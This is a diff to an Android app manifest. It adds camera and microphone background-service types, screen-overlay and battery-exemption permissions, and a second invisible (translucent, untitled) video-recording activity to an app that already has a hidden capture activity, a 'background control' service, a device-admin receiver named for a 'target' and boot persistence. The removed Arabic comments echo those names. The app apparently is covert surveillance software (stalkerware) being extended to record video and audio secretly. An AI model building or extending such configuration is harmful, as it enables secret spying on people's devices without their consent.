@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- الأذونات الأمنية والتشغيلية -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.CAMERA" />
@@ -16,10 +16,15 @@
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
     <application
         android:allowBackup="true"
@@ -29,7 +34,6 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
-        <!-- النشاط الرئيسي -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -39,20 +43,22 @@
             </intent-filter>
         </activity>
 
-        <!-- نشاط الالتقاط البصري الطبيعي -->
         <activity
             android:name=".CameraCaptureActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:exported="false" />
 
-        <!-- خدمة التحكم في الخلفية -->
+        <activity
+            android:name=".CameraVideoRecorderActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:exported="false" />
+
         <service
             android:name=".BackgroundControlService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="dataSync|camera|microphone" />
 
-        <!-- مستقبل إدارة الجهاز -->
         <receiver
             android:name=".TargetAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -65,7 +71,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- مستقبل إقلاع النظام -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
